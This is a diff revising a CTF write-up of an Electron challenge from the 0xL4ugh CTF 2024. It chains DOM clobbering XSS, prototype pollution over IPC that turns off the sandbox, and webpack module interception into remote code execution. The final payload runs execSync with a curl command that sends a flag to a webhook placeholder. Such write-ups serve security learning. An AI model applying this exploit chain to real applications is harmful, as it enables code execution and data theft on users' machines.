@@ -5,29 +5,34 @@ draft = false
 tags = ['ctf-writeup', 'electron', 'web']
 +++
 
-## The Problem
+## Introduction
 
-There are tons of files for this challenge, but our main focus would be these 2 files which defines the electron app.
+This writeup covers the "Ada Indonesia Coy" challenge from the 0xL4ugh CTF 2024. The challenge presents an Electron application with multiple security vulnerabilities that can be chained together to achieve Remote Code Execution (RCE). The exploit path demonstrates several advanced techniques including DOM clobbering, prototype pollution via IPC, and Electron's webpack module interception.
 
-[https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6](https://gist.github.com/nolangilardi/fc8b30441d669a985b471364bb3d07e6)
+## Challenge Setup and Configuration
 
-Our `BroweserWindow` loaded with this config as nodeIntegration and contextIsolation set to false. This means that the renderer doesnt get access to node feature except for the preload script (nodeIntegration:false), but both the preload and electron internal shares the same Javascript context (contextIsolation:false).
+The Electron application is configured with the following critical security settings in the `BrowserWindow` initialization:
 
-The `BrowserWindow` is loaded with the following configuration:
 ```js
-    webPreferences: {
-      preload: path.join(__dirname, "./preload.js"),
-      nodeIntegration: false,
-      contextIsolation: false,
-    },
+webPreferences: {
+  preload: path.join(__dirname, "./preload.js"),
+  nodeIntegration: false,
+  contextIsolation: false,
+},
 ```
-With `nodeIntegration: false`, the renderer process doesn't have direct access to Node.js features. Meanwhile, `contextIsolation: false` means the preload script and Electron internals share the same JavaScript context.
 
-## Vulns
+These settings create a specific security posture:
 
-### XSS in renderer
+- **`nodeIntegration: false`** - The renderer process cannot directly access Node.js APIs
+- **`contextIsolation: false`** - The preload script, renderer process, and Electron internals share the same JavaScript context
 
-The following function is designed to create an iframe for displaying notes:
+The combination of `nodeIntegration: false` and `contextIsolation: false` creates an interesting attack surface: while direct Node.js access is blocked, the shared JavaScript context allows for sophisticated context manipulation attacks.
+
+## Vulnerability Analysis
+
+### 1. DOM Clobbering XSS in Note Display
+
+The application uses a function to display notes in iframes that contains a critical DOM clobbering vulnerability:
 
 ```js
 async function createNoteFrame(html, time) {
@@ -49,18 +54,22 @@ async function createNoteFrame(html, time) {
     return note
 }
 
-...
-
 const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
 ```
 
-We can leverage DOM clobbering of `dialog.close` or `dialog.showModal` to execute arbitrary JavaScript code. This is one of the quirks of `setTimeout` and `setInterval`, where if we suply the first argument as string, it will try to create new Js Function and execute it. The payload would be like this
+**Vulnerability Details:**
+The `setInterval()` function accepts a string as its first argument, which gets evaluated as JavaScript when passed. By using DOM clobbering to override the `dialog` object, we can inject arbitrary JavaScript that executes when `setInterval()` calls `dialog.close` or `dialog.showModal`.
 
+**DOM Clobbering Payload:**
 ```html
 <a id=dialog name=close href="foo:console.log(1337)">
 ```
 
-### Prototype Pollution in config via IPC communication
+When this payload is processed, `setInterval(dialog.close, time / 2)` becomes equivalent to `setInterval("console.log(1337)", time / 2)`, executing our JavaScript code.
+
+### 2. Prototype Pollution via IPC Communication
+
+The application exposes three IPC handlers through the preload script:
 
 ```js
 // main.js
@@ -103,63 +112,31 @@ class api {
 window.api = new api()
 ```
 
-`preload.js` exposes the 3 custom ipcs to renderer. `set-config` ipc handler directly modifies config object using `Object.assign`. By setting `config.__proto__` to arbitrary value, this means we have prototype pollution.
+**Vulnerability Details:**
+The `set-config` IPC handler uses `Object.assign(config[conf], obj)` without any validation, allowing prototype pollution by targeting `config.__proto__`. This technique can override default Electron configuration values for newly created `BrowserWindow` instances.
 
-This prototype pollution can be used to toggle on/off some default configuration where spawnin new `BrowserWindow` using the overriden value with prototype pollution, for example ticking off sandbox so that newly spawned BrowserWindow would have `--no-sandbox`. 
-
-
-We can confirm this by running the below JS directly into dev console (open it with Ctrl+Shift+I) and then check the running process using `ps`.
-
+**Exploitation:**
 ```js
-api.setConfig("__proto__", {sandbox:0})
+api.setConfig("__proto__", {sandbox: false})
 api.window()
 ```
 
+This pollutes the prototype chain to set `sandbox: false`, causing subsequently created `BrowserWindow` instances to launch with the `--no-sandbox` flag:
+
 ```
-user       23110   23024  1 05:33 pts/4    00:00:00 /redacted/baby-electron
-                     --type=renderer
-                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
-                     --user-data-dir=/home/user/.config/baby-electron
-                     --app-path=/redacted/resources/app.asar
-                     --enable-sandbox
-                     --disable-gpu-compositing
-                     --lang=en-US
-                     --num-raster-threads=3
-                     --enable-main-frame-before-activation
-                     --renderer-client-id=5
-                     --time-ticks-at-unix-epoch=-1735446046824602
-                     --launch-time-ticks=4336005364
-                     --shared-files=v8_context_snapshot_data:100
-                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
-                     --disable-features=SpareRendererForSitePerProcess
-...
-user       23245   23017  2 05:33 pts/4    00:00:00 /redacted/baby-electron
-                     --type=renderer
-                     --enable-crash-reporter=1055940f-328a-45d8-8bec-258737cfdddc,no_channel
-                     --user-data-dir=/home/user/.config/baby-electron
-                     --app-path=/redacted/resources/app.asar
-                     --no-sandbox
-                     --no-zygote
-                     --disable-gpu-compositing
-                     --lang=en-US
-                     --num-raster-threads=3
-                     --enable-main-frame-before-activation
-                     --renderer-client-id=10
-                     --time-ticks-at-unix-epoch=-1735446046824602
-                     --launch-time-ticks=4359800634
-                     --shared-files=v8_context_snapshot_data:100
-                     --field-trial-handle=0,i,3045807141174497258,9035281799453053754,262144
-                     --disable-features=SpareRendererForSitePerProcess
+# Normal process
+--enable-sandbox
+
+# Polluted process  
+--no-sandbox
+--no-zygote
 ```
 
-notice that there are 2 electron process, one with `--enable-sandbox` and the other one with `--no-sandbox`.
+### 3. Webpack Module Exposure via Context Manipulation
 
-### Exposing node modules to renderer process
+Since the `BrowserWindow` runs with `contextIsolation: false`, we can manipulate the shared JavaScript context to expose Node.js modules. Electron internally uses webpack for module loading, which performs lazy loading of internal modules like `ipcRenderer`.
 
-Since BrowserWindow started with contextIsolation set to false, we can expose it using polluting builtins objects (Js context shared with electron internals). This is explained better in the other author challenge writeup [2023 HITCON CTF - Harmony](https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony).
-
-This works because electron internally uses webpack and webpack require will do a lazy load. When electron internally does `__webpack_require__("./lib/renderer/api/ipc-renderer.ts")`, we will intercept it and copy `this` object from `t` and exposes it to our window renderer. This code explains better than words,
-
+**Interception Technique:**
 ```js
 window.copyOfIpcRenderer = null;
 Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
@@ -172,6 +149,9 @@ Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
   }
 });
 ```
+
+**How it Works:**
+Electron internally calls `__webpack_require__("./lib/renderer/api/ipc-renderer.ts")` to load the IPC renderer. Our property interceptor captures this moment and copies the `this.module` object (which contains Node.js's `require` function) to our window context:
 
 ```js
 function __webpack_require__(r) {
@@ -186,19 +166,13 @@ function __webpack_require__(r) {
 }
 ```
 
-## Chaining it together
+This technique grants us access to Node.js modules, including `child_process` for RCE.
 
-Since the javascript code will be executed on `setInterval`, we can clean this up to execute only one within sync guard if block
+## Attack Chain Assembly
 
-```js
-if (!window.SyncOnce) {
-  window.SyncOnce = true;
-  ...
-}
-```
+The complete exploit chain follows these steps, each protected by sync guards to prevent multiple execution:
 
-First, we will need to intercept the `__webpack_require__` function, due to electron lazyLoading ipcRenderer and we will need to intercept it before we do any ipc communication.
-
+**Step 1: Webpack Interceptor Setup**
 ```js
 if (!window.SyncOnce) {
   window.SyncOnce = true;
@@ -216,21 +190,21 @@ if (!window.SyncOnce) {
 }
 ```
 
-Secondly, we can start do some ipc communications. Using prototype pollution to disable sandbox and spawn new BrowserWindow,
-
+**Step 2: Prototype Pollution for Sandbox Bypass**
 ```js
 if (!window.SyncOnce) {
   window.SyncOnce = true;
   
-  // snip
-
-  api.setConfig(`__proto__`, {sandbox:false});
+  // Webpack interceptor from Step 1
+  
+  api.setConfig(`__proto__`, { sandbox: false });
   api.window();
 }
 ```
 
-The new BrowserWindow will have same `document.location` as our first window, thus makes it executing the same xss payload. At this point we have exposed node modules to our renderer, so we just need to execute RCE payload
+The new `BrowserWindow` inherits the same `document.location`, causing it to load the same malicious payload with our DOM clobbering attack.
 
+**Step 3: Node.js Module Access and RCE**
 ```js
 if (window.module && !window.syncOnce2) {
   window.syncOnce2 = true;
@@ -238,12 +212,14 @@ if (window.module && !window.syncOnce2) {
 }
 ```
 
-## Final Payload
+## Final Exploit
 
+**Complete Payload:**
 ```js
 if (!window.syncOnce) {
   window.syncOnce = true;
 
+  // Webpack module interception
   window.copyOfIpcRenderer = null;
   Object.defineProperty(Object.prototype, `./lib/renderer/api/ipc-renderer.ts`, {
     set(v) {
@@ -255,26 +231,27 @@ if (!window.syncOnce) {
     }
   });
 
+  // Prototype pollution for sandbox bypass
   api.setConfig(`__proto__`, { sandbox: false });
   api.window();
 }
 
-
+// RCE execution after Node.js modules are exposed
 if (window.module && !window.syncOnce2) {
   window.syncOnce2 = true;
   window.module.exports._load(`child_process`).execSync(`curl http://webhook -d flag=$(/readflag)`);
 }
 ```
 
-### Smuggling the Payload
-
-Encode the payload in dom clobbering attack
+**Payload Delivery via DOM Clobbering:**
 ```html
 <a id=dialog name=close href="foo:PAYLOAD">
 ```
 
-Use a meta-equiv tag to redirect and inject URL encoded DOM clobbering payload via the URL hash:
+**URL-Based Injection:**
+The payload can be delivered through URL manipulation using a meta refresh redirect:
 
 ```html
-<meta http-equiv="refresh" content="0; url=https://127.0.0.1:3000/#...">
+<meta http-equiv="refresh" content="0; url=https://127.0.0.1:3000/#URL_ENCODED_DOM_CLOBBERING_PAYLOAD">
 ```
+
